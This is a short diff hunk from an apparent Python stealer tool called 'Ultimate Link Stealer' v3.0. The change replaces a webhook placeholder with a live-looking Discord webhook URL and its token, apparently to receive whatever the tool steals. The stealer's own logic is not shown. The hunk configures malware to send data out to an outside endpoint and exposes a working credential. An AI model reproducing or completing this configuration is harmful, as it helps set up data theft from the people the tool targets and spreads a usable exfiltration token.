@@ -9,7 +9,7 @@ __app__ = "Ultimate Link Stealer"
 __version__ = "v3.0"
 
 config = {
-    "webhook": "YOUR_WEBHOOK_HERE",
+    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
     "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
     "username": "Ultimate Stealer",
     "color": 0x00FFFF,
